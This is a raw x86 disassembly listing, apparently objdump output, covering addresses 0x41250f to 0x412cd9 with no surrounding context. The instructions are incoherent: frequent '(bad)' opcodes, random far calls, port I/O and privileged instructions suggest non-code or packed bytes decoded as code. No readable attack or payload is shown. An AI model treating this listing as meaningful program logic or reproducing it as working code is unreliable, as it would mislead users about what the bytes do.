  41250f:	or     BYTE PTR [ebx+0x21],dh
  412512:	in     al,dx
  412513:	mov    ecx,DWORD PTR [esi-0x22ebb6f7]
  412519:	ss add eax,0xa08fb222
  41251f:	call   0xb4a6:0xd8ff358a
  412526:	add    dh,BYTE PTR [ebx]
  412528:	jnp    0x412544
  41252a:	in     eax,dx
  41252b:	jno    0x41258d
  41252d:	push   ss
  41252e:	outs   dx,DWORD PTR ds:[esi]
  41252f:	mov    ebp,0xb6a477b5
  412534:	scas   al,BYTE PTR es:[edi]
  412535:	jecxz  0x412519
  412537:	neg    BYTE PTR [ecx-0xc]
  41253a:	sbb    edx,DWORD PTR [edx-0x6a3b3700]
  412540:	or     BYTE PTR [esi+0x3bcfc0ab],0x91
  412547:	jb     0x4125a9
  412549:	and    eax,0x3d1f0665
  41254e:	fstp   st(2)
  412550:	(bad)  
  412551:	jmp    0x412561
  412553:	add    dh,cl
  412555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412556:	inc    edx
  412557:	imul   esi,DWORD PTR [esi-0x1f365d6a],0xffffffc8
  41255e:	or     DWORD PTR [esi],esp
  412560:	repnz or DWORD PTR [ecx-0x14],ecx
  412564:	adc    DWORD PTR [eax+esi*8+0x30ccfd90],esp
  41256b:	in     eax,dx
  41256c:	adc    BYTE PTR [ecx],dl
  41256e:	fidivr DWORD PTR [eax]
  412570:	cdq    
  412571:	mov    ah,0x9f
  412573:	dec    eax
  412574:	fiadd  DWORD PTR [ebx-0x2f00c126]
  41257a:	fwait
  41257b:	test   DWORD PTR [edi-0x131f240d],eax
  412581:	pop    ecx
  412582:	js     0x41258e
  412584:	sbb    BYTE PTR [edx+eax*4+0x8],dh
  412588:	jl     0x4125d3
  41258a:	fmul   st,st(1)
  41258c:	shl    WORD PTR [ecx],0xfe
  412590:	out    dx,al
  412591:	in     al,dx
  412592:	nop
  412593:	sbb    DWORD PTR [eax],esp
  412595:	mov    eax,DWORD PTR [ebx]
  412597:	push   esp
  412598:	pop    es
  412599:	leave  
  41259a:	(bad)  
  41259b:	ficom  WORD PTR [ecx+0x56]
  41259e:	jb     0x4125a1
  4125a0:	icebp  
  4125a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125a2:	outs   dx,BYTE PTR ds:[esi]
  4125a3:	mov    al,0x1e
  4125a5:	mov    ds:0x94f3fc21,al
  4125aa:	scas   al,BYTE PTR es:[edi]
  4125ab:	mov    ds:0x391347e5,al
  4125b0:	rol    DWORD PTR [edi+0x636278d6],1
  4125b6:	sub    ebp,DWORD PTR [esp+esi*4-0xb3ff99a]
  4125bd:	pop    esp
  4125be:	aaa    
  4125bf:	rcr    edi,cl
  4125c1:	cmp    al,0x8a
  4125c3:	icebp  
  4125c4:	lahf   
  4125c5:	aaa    
  4125c6:	imul   BYTE PTR [edi]
  4125c8:	add    eax,0xde2e7804
  4125cd:	and    eax,0xf5ddade1
  4125d2:	xor    esi,ebp
  4125d4:	fcomp  QWORD PTR [eax+0x10]
  4125d7:	lea    esi,[ebp+0x7fe959d]
  4125dd:	and    al,0xfc
  4125df:	adc    bl,cl
  4125e1:	fsub   st(6),st
  4125e3:	xchg   DWORD PTR [eax+0x56cacc7a],edx
  4125e9:	pop    edx
  4125ea:	rcl    BYTE PTR [esi-0x3bfa5be1],0xac
  4125f1:	loop   0x412666
  4125f3:	sub    dh,BYTE PTR [ebp-0x6d]
  4125f6:	inc    esi
  4125f7:	out    dx,al
  4125f8:	and    eax,0xb1b2697
  4125fd:	jmp    0x28ef:0x3ae4a6f5
  412604:	pop    ds
  412605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412606:	push   esi
  412607:	cmp    al,0x3e
  412609:	das    
  41260a:	leave  
  41260b:	add    ah,dl
  41260d:	push   ebx
  41260e:	fldenv [ebx]
  412610:	retf   
  412611:	pop    ebx
  412612:	pop    ds
  412613:	pop    ds
  412614:	mov    ecx,fs
  412616:	shl    BYTE PTR ds:0xac4fa708,cl
  41261c:	or     al,0x3a
  41261e:	sub    BYTE PTR [esi+0x7a],bl
  412621:	sub    edi,DWORD PTR [edx+esi*4+0x64]
  412625:	inc    ecx
  412626:	push   ebx
  412627:	cmp    ah,dh
  412629:	bound  edi,QWORD PTR ss:0xb1e268f6
  412630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412631:	clc    
  412632:	ja     0x4126a1
  412634:	mov    eax,ds:0xde290b84
  412639:	add    ebp,DWORD PTR [eax-0x23]
  41263c:	stc    
  41263d:	sub    ch,BYTE PTR ds:0xa33e9e80
  412643:	repnz fst QWORD PTR [eax+0x72]
  412647:	int3   
  412648:	mov    al,0xf1
  41264a:	ret    0xed2a
  41264d:	fimul  WORD PTR [ecx]
  41264f:	retf   
  412650:	test   ebx,edi
  412652:	xchg   edx,eax
  412653:	jne    0x4126bf
  412655:	lods   al,BYTE PTR ds:[esi]
  412656:	inc    ebp
  412657:	and    ch,BYTE PTR [ecx-0x359dc03c]
  41265d:	cwde   
  41265e:	jns    0x41266e
  412660:	or     bh,BYTE PTR [ebx-0x79]
  412663:	push   ebp
  412664:	mov    esi,DWORD PTR [ecx]
  412666:	and    DWORD PTR [ebp-0x6330679d],ebp
  41266c:	into   
  41266d:	frstor [eax]
  41266f:	stos   DWORD PTR es:[edi],eax
  412670:	popa   
  412671:	jb     0x412601
  412673:	loope  0x41267d
  412675:	idiv   BYTE PTR [eax*8+0x27b9ea79]
  41267c:	gs sbb al,0xf0
  41267f:	ss sub dh,0xaa
  412683:	dec    ecx
  412684:	int    0x83
  412686:	stos   BYTE PTR es:[edi],al
  412687:	clc    
  412688:	push   0xf1c359a2
  41268d:	scas   eax,DWORD PTR es:[edi]
  41268e:	test   DWORD PTR [edx-0x60],eax
  412691:	scas   al,BYTE PTR es:[edi]
  412692:	int    0x9
  412694:	call   0x258c:0x6d842642
  41269b:	mov    ah,0xc0
  41269d:	cmp    ebp,edx
  41269f:	mov    esp,cs
  4126a1:	clc    
  4126a2:	lock mov ah,0x42
  4126a5:	mov    al,0xd7
  4126a7:	dec    eax
  4126a8:	cmp    DWORD PTR [ecx+0x28],ebx
  4126ab:	xchg   edx,eax
  4126ac:	cmp    BYTE PTR [eax-0x7a00283c],bh
  4126b2:	mov    esi,0xd694d479
  4126b7:	das    
  4126b8:	into   
  4126b9:	cs cli 
  4126bb:	sub    ah,BYTE PTR ds:0x643df9a8
  4126c1:	xchg   edi,eax
  4126c2:	pop    ecx
  4126c3:	call   0x5217:0xeb1445c5
  4126ca:	pop    esi
  4126cb:	shl    ch,cl
  4126cd:	test   eax,0x5c812094
  4126d2:	xchg   esp,eax
  4126d3:	push   ebx
  4126d4:	test   DWORD PTR [edx],esp
  4126d6:	shl    BYTE PTR [edx-0x5633e142],cl
  4126dc:	push   bx
  4126de:	retf   
  4126df:	or     DWORD PTR [edx],edx
  4126e1:	xor    ch,BYTE PTR [ecx]
  4126e3:	loop   0x412742
  4126e5:	xor    edi,DWORD PTR [esi]
  4126e7:	popa   
  4126e8:	sar    bh,1
  4126ea:	ret    
  4126eb:	jmp    0x8066:0x7f09f012
  4126f2:	inc    edx
  4126f3:	cmp    ebp,DWORD PTR [edx]
  4126f5:	das    
  4126f6:	rol    BYTE PTR [edi+0x6e130600],0x7b
  4126fd:	jno    0x412775
  4126ff:	add    eax,esp
  412701:	js     0x4126d0
  412703:	(bad)  
  412705:	mov    eax,0x7e45edb9
  41270a:	(bad)  
  41270c:	push   0x859220a0
  412711:	xchg   ebx,eax
  412712:	push   esp
  412713:	or     edi,DWORD PTR [ebp-0x114f18ca]
  412719:	jnp    0x412759
  41271b:	dec    esi
  41271c:	in     eax,0x7a
  41271e:	jle    0x4126fa
  412720:	(bad)  
  412721:	pop    ebp
  412722:	jp     0x41271b
  412724:	sub    esi,DWORD PTR [esi]
  412726:	les    esp,FWORD PTR [eax]
  412728:	std    
  412729:	loope  0x41277c
  41272b:	jmp    0x1d1a:0xdafe3f1e
  412732:	mov    ecx,0x4e8a753c
  412737:	cld    
  412738:	adc    ebx,0xea0af9b4
  41273e:	dec    ebx
  41273f:	xchg   al,dh
  412741:	repnz cmp ch,BYTE PTR [eax]
  412744:	mov    bh,BYTE PTR [edx-0x77f27b09]
  41274a:	mul    BYTE PTR [esi-0x69]
  41274d:	jns    0x412731
  41274f:	or     eax,0xb8a50b39
  412754:	jnp    0x412736
  412756:	push   esp
  412757:	dec    ebp
  412758:	mov    edi,0x98e0f361
  41275d:	call   0xd0f9b4f5
  412762:	add    BYTE PTR [ebp+0x5a],dh
  412765:	repz sbb bh,0xf7
  412769:	mov    BYTE PTR [edx],bh
  41276b:	sub    cl,BYTE PTR [ebx]
  41276d:	jmp    0xe861e1ad
  412772:	pop    ebx
  412773:	mov    eax,cs:0x5966ae04
  412779:	pop    esp
  41277a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41277b:	in     al,0x83
  41277d:	std    
  41277e:	jne    0x4127ab
  412780:	push   ebx
  412781:	mov    al,0xa8
  412783:	pop    es
  412784:	repnz outs dx,BYTE PTR ds:[esi]
  412786:	adc    al,0xad
  412788:	mov    esp,0x376e36d
  41278d:	mov    bh,0x64
  41278f:	or     dl,al
  412791:	in     al,0x1e
  412793:	push   esp
  412794:	mov    DWORD PTR [edx+0x42e8b1dd],edi
  41279a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41279b:	popa   
  41279c:	scas   eax,DWORD PTR es:[edi]
  41279d:	xchg   esp,eax
  41279e:	mov    edi,0xe9bb4426
  4127a3:	in     eax,0x2f
  4127a5:	and    dh,BYTE PTR [edi-0x18]
  4127a8:	lea    edi,[ebx+0x3a]
  4127ab:	pop    ebx
  4127ac:	retf   0x1a12
  4127af:	(bad)  
  4127b0:	and    eax,0x4baee006
  4127b5:	sub    eax,0x378318e5
  4127ba:	pop    ebp
  4127bb:	sti    
  4127bc:	(bad)  
  4127bd:	mov    bl,0x15
  4127bf:	add    BYTE PTR [ebp-0x64],ch
  4127c2:	repz mov dh,0x4c
  4127c5:	rcl    BYTE PTR [edi+ebp*2-0xd],1
  4127c9:	sub    BYTE PTR [ecx],al
  4127cb:	shl    BYTE PTR [eax+esi*4-0x6c9ce530],cl
  4127d2:	ret    0x53f5
  4127d5:	pusha  
  4127d6:	(bad)  
  4127d7:	ss stos DWORD PTR es:[edi],eax
  4127d9:	les    esi,FWORD PTR [esi-0x7]
  4127dc:	ret    
  4127dd:	mov    cl,BYTE PTR [ecx+eax*2+0x23]
  4127e1:	cs pop esp
  4127e3:	add    BYTE PTR [esp+0x1cf61e58],0x90
  4127eb:	mov    DWORD PTR [eax],esp
  4127ed:	push   ss
  4127ee:	mov    ah,0x41
  4127f0:	hlt    
  4127f1:	imul   ecx,DWORD PTR [ebp+0x29],0xeb507e72
  4127f8:	clc    
  4127f9:	idiv   ecx
  4127fb:	pop    es
  4127fc:	jle    0x412831
  4127fe:	mov    cl,BYTE PTR [esi]
  412800:	(bad)  
  412801:	sub    ch,BYTE PTR [ecx+0x1d190d77]
  412807:	test   ah,bl
  412809:	std    
  41280a:	pop    eax
  41280b:	into   
  41280c:	mov    esi,0x61c210fe
  412811:	cld    
  412812:	mov    cl,0xbc
  412814:	add    al,0x9c
  412816:	mov    dl,0x88
  412818:	xchg   ebx,eax
  412819:	inc    ecx
  41281a:	int    0x8b
  41281c:	sbb    dh,dh
  41281e:	aad    0xcc
  412820:	js     0x412822
  412822:	inc    ebx
  412823:	icebp  
  412824:	mov    edi,0xbedd6fbb
  412829:	xchg   ebx,eax
  41282a:	fmul   DWORD PTR [eax]
  41282c:	or     DWORD PTR [eax+0x36bc5ec1],ebp
  412832:	inc    edx
  412833:	pop    esi
  412834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412835:	shl    BYTE PTR [esp+edx*2+0x6d4ed6f4],1
  41283c:	aaa    
  41283d:	and    BYTE PTR [ebp+0x2d2004c9],ah
  412843:	scas   eax,DWORD PTR es:[edi]
  412844:	or     al,0xb2
  412846:	dec    ebx
  412847:	sbb    al,0x7
  412849:	push   edx
  41284a:	adc    BYTE PTR [ecx+0x4],ah
  41284d:	daa    
  41284e:	mov    esi,0x3b77a63e
  412853:	jo     0x412840
  412855:	out    dx,al
  412856:	lahf   
  412857:	in     al,0x45
  412859:	clc    
  41285a:	xor    eax,0x5f2bf93f
  41285f:	add    BYTE PTR [eax],dh
  412861:	mov    cl,0xf1
  412863:	aas    
  412864:	loopne 0x4127f7
  412866:	and    dl,BYTE PTR [edx]
  412868:	sub    edx,DWORD PTR [ebp-0x2e048488]
  41286e:	test   eax,0x768d090c
  412873:	(bad)  
  412874:	not    DWORD PTR [edx]
  412876:	inc    ebx
  412877:	push   ds
  412878:	mov    ch,0x54
  41287a:	je     0x412864
  41287c:	mov    ebx,0xe8f5141c
  412881:	retf   
  412882:	pop    edi
  412883:	call   0x274170c3
  412888:	mov    bl,BYTE PTR [ebx]
  41288a:	mov    DWORD PTR [edi+0x9],edx
  41288d:	and    cl,BYTE PTR [edi+0xfcef4c8]
  412893:	imul   esi,DWORD PTR [esi-0x7a],0xc8118bd0
  41289a:	xor    eax,0xfcfc91c2
  41289f:	pop    esi
  4128a0:	scas   al,BYTE PTR es:[edi]
  4128a1:	in     eax,dx
  4128a2:	jbe    0x4128a8
  4128a4:	inc    ecx
  4128a5:	mov    eax,ds:0x9c8c55c9
  4128aa:	bound  edx,QWORD PTR [esi-0x29]
  4128ad:	(bad)  
  4128ae:	fst    QWORD PTR [ecx-0x367db8d9]
  4128b4:	es gs pusha 
  4128b7:	pushf  
  4128b8:	(bad)  
  4128b9:	(bad)  
  4128ba:	(bad)  
  4128bb:	jecxz  0x41283f
  4128bd:	retf   0x72dc
  4128c0:	jl     0x41290f
  4128c2:	dec    edi
  4128c3:	xor    ah,al
  4128c5:	outs   dx,BYTE PTR ds:[esi]
  4128c6:	xor    BYTE PTR [edx+0x5842102],0x53
  4128cd:	inc    edi
  4128ce:	or     bh,dl
  4128d0:	mov    eax,ds:0x70a326da
  4128d5:	clc    
  4128d6:	and    al,0x92
  4128d8:	pop    ds
  4128d9:	jl     0x412942
  4128db:	stos   BYTE PTR es:[edi],al
  4128dc:	stc    
  4128dd:	push   ds
  4128de:	stc    
  4128df:	adc    BYTE PTR [edx],0xad
  4128e2:	mov    ds,WORD PTR [esi+0x7396edb0]
  4128e8:	icebp  
  4128e9:	lods   eax,DWORD PTR ds:[esi]
  4128ea:	inc    ecx
  4128eb:	rcl    BYTE PTR [ecx],cl
  4128ed:	jp     0x412966
  4128ef:	or     ch,BYTE PTR [edi-0x7c6ed9b3]
  4128f5:	jg     0x412894
  4128f7:	or     al,0xa0
  4128f9:	push   cs
  4128fa:	adc    esp,DWORD PTR [ecx]
  4128fc:	int3   
  4128fd:	xchg   esi,edx
  4128ff:	sti    
  412900:	inc    ebx
  412901:	jae    0x412894
  412903:	xchg   BYTE PTR [ecx],al
  412905:	push   cs
  412906:	sbb    al,0x8b
  412908:	jb     0x41296c
  41290a:	icebp  
  41290b:	jmp    0x756b:0xbe2ca4c8
  412912:	fisttp QWORD PTR [esi+0x513368e8]
  412918:	adc    ebp,esi
  41291a:	push   cs
  41291b:	mov    dl,0xe4
  41291d:	data16 jno 0x412992
  412920:	stos   DWORD PTR es:[edi],eax
  412921:	clc    
  412922:	sub    al,0xe8
  412924:	adc    eax,0x257dcc49
  412929:	mov    bh,0xdc
  41292b:	or     edx,ecx
  41292d:	jno    0x412900
  41292f:	add    DWORD PTR [edx+eax*4+0x5b],ecx
  412933:	mov    ecx,0x6b901415
  412938:	mov    cl,dh
  41293a:	loopne 0x4128d2
  41293c:	jnp    0x412900
  41293e:	lock cmp dh,ch
  412941:	cli    
  412942:	pop    ebx
  412943:	pusha  
  412944:	popa   
  412945:	dec    ebp
  412946:	clc    
  412947:	and    esp,DWORD PTR [eax]
  412949:	pop    ebp
  41294a:	inc    esp
  41294b:	loop   0x412931
  41294d:	jne    0x4128f9
  41294f:	lods   al,BYTE PTR ds:[esi]
  412950:	cmp    BYTE PTR [ebp+edx*8-0x13],al
  412954:	(bad)  [eax]
  412956:	mov    al,ds:0x8d42b45a
  41295b:	icebp  
  41295c:	mov    ecx,DWORD PTR [edx+0x407de890]
  412962:	add    edi,DWORD PTR [eax]
  412964:	or     BYTE PTR [ebx],bl
  412966:	out    dx,al
  412967:	or     dl,ch
  412969:	aam    0x75
  41296b:	jmp    0xe94b:0x5615b37b
  412972:	dec    eax
  412973:	fcmovu st,st(3)
  412975:	stos   BYTE PTR es:[edi],al
  412976:	jb     0x412962
  412978:	ret    
  412979:	xchg   ebp,eax
  41297a:	and    BYTE PTR [edi],dh
  41297c:	xchg   esi,eax
  41297d:	hlt    
  41297e:	mov    cl,0xc3
  412980:	call   0xa1c790a7
  412985:	jge    0x412933
  412987:	test   BYTE PTR [ebx-0x6b3a54e8],0xbc
  41298e:	push   0xffffff9f
  412990:	int3   
  412991:	mov    dh,0x4f
  412993:	mov    edi,0xa8323ee9
  412998:	push   edi
  412999:	lods   al,BYTE PTR ds:[esi]
  41299a:	pop    ebx
  41299b:	hlt    
  41299c:	jle    0x41292e
  41299e:	mov    WORD PTR [ecx+0x21b635f6],?
  4129a4:	in     al,0xf5
  4129a6:	xchg   ebp,eax
  4129a7:	scas   al,BYTE PTR es:[edi]
  4129a8:	fwait
  4129a9:	out    0x1f,eax
  4129ab:	(bad)  
  4129ac:	sub    al,0xa4
  4129ae:	adc    BYTE PTR [ecx+ebx*4-0x27],bl
  4129b2:	sub    dh,ch
  4129b4:	xchg   dh,al
  4129b6:	std    
  4129b7:	push   edx
  4129b8:	les    eax,FWORD PTR [ecx-0x2b]
  4129bb:	ins    BYTE PTR es:[edi],dx
  4129bc:	mov    ch,0x98
  4129be:	inc    ecx
  4129bf:	ret    
  4129c0:	ja     0x412a1f
  4129c2:	mov    al,ds:0x2d24a292
  4129c7:	das    
  4129c8:	ret    0xbd7f
  4129cb:	pop    esp
  4129cc:	add    eax,0x783a2832
  4129d1:	dec    edx
  4129d2:	sbb    al,0x17
  4129d4:	mov    edx,0x862106cc
  4129d9:	sbb    BYTE PTR [eax],0x29
  4129dc:	mov    eax,ds:0xbcc35533
  4129e1:	sbb    edx,DWORD PTR [ebx+0x427314c2]
  4129e7:	mov    eax,ds:0x17c38406
  4129ec:	mov    ebp,0x9cdd5318
  4129f1:	imul   BYTE PTR [esi+0x22]
  4129f4:	jecxz  0x412a5c
  4129f6:	not    BYTE PTR [eax]
  4129f8:	cli    
  4129f9:	mov    edi,0x5f4188f2
  4129fe:	loop   0x412a51
  412a00:	or     edx,DWORD PTR [ecx]
  412a02:	int3   
  412a03:	push   esp
  412a04:	jmp    0x4129cb
  412a06:	out    dx,eax
  412a07:	pop    ecx
  412a08:	jl     0x412a24
  412a0a:	jnp    0x412a7e
  412a0c:	daa    
  412a0d:	test   DWORD PTR [esi-0x4d],0x50f4228f
  412a14:	je     0x4129ba
  412a16:	push   esp
  412a17:	jnp    0x412a76
  412a19:	ror    al,1
  412a1b:	mov    eax,ds:0xd89d48ca
  412a20:	xchg   edi,eax
  412a21:	js     0x4129cf
  412a23:	dec    ebx
  412a24:	ins    BYTE PTR es:[edi],dx
  412a25:	loop   0x4129f7
  412a27:	or     BYTE PTR [ebx],ch
  412a29:	retf   0xe534
  412a2c:	lods   al,BYTE PTR ds:[esi]
  412a2d:	add    ecx,DWORD PTR fs:[edx-0x22245a6]
  412a34:	sub    al,0x4b
  412a36:	adc    al,0xf0
  412a38:	lahf   
  412a39:	(bad)  
  412a3a:	sub    eax,0x250340e2
  412a3f:	bound  ebx,QWORD PTR [ebx-0x7f5dde6]
  412a45:	cmp    eax,0x7da0d53c
  412a4a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a4c:	ror    edi,cl
  412a4e:	sub    bl,dl
  412a50:	aad    0x4d
  412a52:	adc    al,0x6f
  412a54:	ins    DWORD PTR es:[edi],dx
  412a55:	mov    bh,0xcf
  412a57:	mov    esp,ebp
  412a59:	jl     0x412aad
  412a5b:	js     0x412a9b
  412a5d:	fwait
  412a5e:	jns    0x412a23
  412a60:	push   0x2f
  412a62:	and    al,0x51
  412a64:	push   ebx
  412a65:	es ja  0x412a4b
  412a68:	sbb    dh,ah
  412a6a:	retf   
  412a6b:	out    0x6c,al
  412a6d:	push   0x59
  412a6f:	mov    ah,0xe
  412a71:	cld    
  412a72:	test   eax,0x8dbd46fb
  412a77:	add    al,0xf2
  412a79:	rep lods al,BYTE PTR ds:[esi]
  412a7b:	scas   al,BYTE PTR es:[edi]
  412a7c:	adc    BYTE PTR [eax-0x4a199761],cl
  412a82:	pop    esi
  412a83:	push   edx
  412a84:	mov    ebx,0x71e34a4c
  412a89:	or     eax,0x10b1e9b6
  412a8e:	je     0x412a83
  412a90:	xor    eax,0x639d57a4
  412a95:	lock mov edx,0x417ae8c9
  412a9b:	outs   dx,DWORD PTR ds:[esi]
  412a9c:	cli    
  412a9d:	cwde   
  412a9e:	(bad)  
  412aa0:	ds jno 0x412b1d
  412aa3:	mov    edx,0x37a7c6b7
  412aa8:	sar    BYTE PTR [ecx+ebp*4+0x5122a725],1
  412aaf:	push   edx
  412ab0:	xchg   edx,eax
  412ab1:	dec    ebx
  412ab2:	mov    DWORD PTR [ebp-0x44],0x911e6c0f
  412ab9:	enter  0x80c9,0xe6
  412abd:	lea    eax,[edi]
  412abf:	rol    bh,1
  412ac1:	and    esp,eax
  412ac3:	mov    eax,0x41f1e87d
  412ac8:	inc    eax
  412ac9:	mov    dl,0x94
  412acb:	dec    ebp
  412acc:	rcl    DWORD PTR [edx+0x67],cl
  412acf:	sub    edi,ebp
  412ad1:	or     ecx,DWORD PTR [ebx-0x79]
  412ad4:	push   es
  412ad5:	inc    edx
  412ad6:	scas   eax,DWORD PTR es:[edi]
  412ad7:	sbb    DWORD PTR [ecx-0x65dff2e7],edx
  412add:	sbb    ah,ah
  412adf:	test   BYTE PTR [ecx+esi*4-0x1c],dh
  412ae3:	aad    0x6c
  412ae5:	out    dx,eax
  412ae6:	repnz xchg esp,eax
  412ae8:	mov    ah,0xac
  412aea:	pop    eax
  412aeb:	jns    0x412ab9
  412aed:	ja     0x412a7d
  412aef:	call   0x7ee0:0x116ba517
  412af6:	stos   DWORD PTR es:[edi],eax
  412af7:	sar    DWORD PTR [ebp+0x7472fc6b],1
  412afd:	lods   eax,DWORD PTR ds:[esi]
  412afe:	dec    ebx
  412aff:	jo     0x412b78
  412b01:	sbb    al,0x2b
  412b03:	sub    al,0x36
  412b06:	lahf   
  412b07:	xor    al,0xbb
  412b09:	div    BYTE PTR [edi+0xe2c756c]
  412b0f:	out    dx,al
  412b10:	mov    eax,0x8c423311
  412b15:	adc    BYTE PTR [esi-0x2439b190],cl
  412b1b:	xor    DWORD PTR [edi+ecx*2],edi
  412b1e:	push   edi
  412b1f:	xor    BYTE PTR [ebp+esi*1-0x3d44dc1e],dl
  412b26:	mov    dl,0x29
  412b28:	clc    
  412b29:	aaa    
  412b2a:	aad    0x76
  412b2c:	stos   BYTE PTR es:[edi],al
  412b2d:	push   edi
  412b2e:	mov    edx,es
  412b30:	out    0x48,al
  412b32:	or     eax,0x24624a8a
  412b37:	and    al,0xc3
  412b39:	dec    edi
  412b3a:	std    
  412b3b:	adc    BYTE PTR [eax+0x5],0x4d
  412b3f:	xor    edx,DWORD PTR [ecx-0x2f]
  412b42:	int3   
  412b43:	adc    edi,esi
  412b45:	scas   al,BYTE PTR es:[edi]
  412b46:	push   edx
  412b47:	jecxz  0x412bb8
  412b49:	test   al,0x48
  412b4b:	cmp    dl,BYTE PTR [eax+0x24]
  412b4e:	add    BYTE PTR [eax+0x510b987b],dl
  412b54:	pushf  
  412b55:	adc    dl,BYTE PTR [edx]
  412b57:	pushf  
  412b58:	(bad)  
  412b59:	imul   BYTE PTR [ebx+0x3b9c6f5]
  412b5f:	xlat   BYTE PTR ds:[ebx]
  412b60:	push   0x52
  412b62:	dec    ebp
  412b63:	mov    BYTE PTR [edi],bl
  412b65:	xor    ch,BYTE PTR [eax]
  412b67:	mov    al,0x7a
  412b69:	ret    0xbe26
  412b6c:	mov    ch,0xa6
  412b6e:	pop    ds
  412b6f:	int    0x22
  412b71:	sbb    eax,0xdc729217
  412b76:	dec    edi
  412b77:	push   es
  412b78:	arpl   WORD PTR [ebx],di
  412b7a:	dec    ecx
  412b7b:	push   cx
  412b7d:	sti    
  412b7e:	mov    BYTE PTR [esi],bl
  412b80:	imul   edx,DWORD PTR [ebp-0x2a87cadc],0x5021563a
  412b8a:	ss cmp esp,0x576c0bb0
  412b91:	sub    esi,DWORD PTR [esi+0x3317e7f7]
  412b97:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  412b99:	imul   BYTE PTR [edx-0x36ee4cca]
  412b9f:	test   al,0x52
  412ba1:	mov    esi,0xe67321fd
  412ba6:	jns    0x412be3
  412ba8:	dec    ebp
  412ba9:	mov    eax,DWORD PTR [ecx+0x794fc25c]
  412baf:	jl     0x412b7a
  412bb1:	pop    ds
  412bb2:	out    dx,eax
  412bb3:	shl    BYTE PTR ds:0xb88eb117,0xf6
  412bba:	pushf  
  412bbb:	pop    eax
  412bbc:	sub    bh,BYTE PTR [ebx-0x26f9cdf1]
  412bc2:	jg     0x412ba4
  412bc4:	int    0xce
  412bc6:	sar    DWORD PTR [eax-0x49],1
  412bc9:	loope  0x412b77
  412bcb:	xlat   BYTE PTR ds:[ebx]
  412bcc:	enter  0xff81,0xb5
  412bd0:	xchg   edi,eax
  412bd1:	fisubr DWORD PTR [eax+0x3e]
  412bd4:	mov    bl,0x90
  412bd6:	fld    QWORD PTR [edx+0x65]
  412bd9:	jg     0x412c1b
  412bdb:	out    0xaf,eax
  412bdd:	mov    edx,0x3b84402f
  412be2:	outs   dx,BYTE PTR ds:[esi]
  412be3:	sbb    cl,BYTE PTR [ebx-0x3360639f]
  412be9:	mov    esp,0xeb6e01e0
  412bee:	call   0xf8d3:0xf57a1ba9
  412bf5:	mov    ecx,0x3a0f09a
  412bfa:	loope  0x412bcf
  412bfc:	pop    eax
  412bfd:	pusha  
  412bfe:	sar    ebx,1
  412c00:	pop    ebx
  412c01:	pop    ds
  412c02:	iret   
  412c03:	cld    
  412c04:	add    BYTE PTR [ecx],ch
  412c06:	rol    DWORD PTR [ebx],cl
  412c08:	mov    bl,0x59
  412c0a:	dec    edi
  412c0b:	fnstsw WORD PTR [edi+0x30]
  412c0e:	arpl   WORD PTR [edi],bp
  412c10:	rcr    DWORD PTR [edx+0x21],1
  412c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c14:	xchg   edi,eax
  412c15:	and    DWORD PTR [ebp+0x79bd1bc5],edx
  412c1b:	adc    DWORD PTR [esi+0x3058cf3e],0xffffffd5
  412c22:	xchg   edi,eax
  412c23:	and    eax,ebp
  412c25:	lock push edi
  412c27:	popf   
  412c28:	and    eax,0x2cf33d88
  412c2d:	retf   0xc43f
  412c30:	or     DWORD PTR [eax],0xfffffff8
  412c33:	xchg   ecx,eax
  412c34:	ss inc edi
  412c36:	scas   al,BYTE PTR es:[edi]
  412c37:	sub    ah,BYTE PTR [edx-0x13]
  412c3a:	fcmovu st,st(4)
  412c3d:	cdq    
  412c3e:	mov    al,0x8b
  412c40:	in     eax,dx
  412c41:	mov    DWORD PTR [edx+0x5465faf9],ebx
  412c47:	vandps ymm0,ymm5,YMMWORD PTR [ecx+0x56]
  412c4c:	lahf   
  412c4d:	popf   
  412c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c4f:	gs adc al,0x4c
  412c52:	mov    edi,DWORD PTR [ebp-0x2ba0717f]
  412c58:	add    DWORD PTR [ebx],edi
  412c5a:	(bad)  
  412c5b:	and    eax,DWORD PTR [ebx]
  412c5d:	cmp    BYTE PTR [edx],al
  412c5f:	or     DWORD PTR [ecx+0x19abf482],edi
  412c65:	mov    esi,esp
  412c67:	jl     0x412bf4
  412c69:	push   esi
  412c6a:	pop    ds
  412c6b:	sbb    al,BYTE PTR ds:0xbc76ceab
  412c71:	adc    ebp,esi
  412c73:	mov    bh,0x16
  412c75:	cmp    eax,ebx
  412c77:	test   BYTE PTR [eax-0x544b5de2],ah
  412c7d:	popa   
  412c7e:	jl     0x412cd5
  412c80:	(bad)  
  412c81:	ret    0x7a01
  412c84:	or     ebp,DWORD PTR [ebx+0x41304d34]
  412c8a:	in     al,dx
  412c8b:	call   0x2b35:0x4c0bdeda
  412c92:	loopne 0x412c25
  412c94:	push   ss
  412c95:	dec    BYTE PTR [edi+0x42]
  412c98:	mov    bl,0x17
  412c9a:	outs   dx,BYTE PTR ds:[esi]
  412c9b:	pop    eax
  412c9c:	sub    edi,DWORD PTR [edi]
  412c9e:	mov    eax,0x4d99d564
  412ca3:	icebp  
  412ca4:	rol    DWORD PTR [eax+0x704a58e0],1
  412caa:	sti    
  412cab:	inc    ecx
  412cac:	pop    ebx
  412cad:	mov    bh,0xe6
  412caf:	sub    ah,BYTE PTR [esi+0xc32661e]
  412cb5:	and    eax,DWORD PTR ds:0x16fa1ebe
  412cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cbc:	pop    ss
  412cbd:	pop    ebx
  412cbe:	es mov ecx,0x8b4b1bd7
  412cc4:	xchg   ebp,edx
  412cc6:	(bad)  
  412cc8:	xor    bh,BYTE PTR [edi+0x46d615bc]
  412cce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ccf:	fwait
  412cd0:	mov    WORD PTR ds:0x8b29dc58,?
  412cd6:	das    
  412cd7:	jmp    0x412c97
  412cd9:	dec    edx
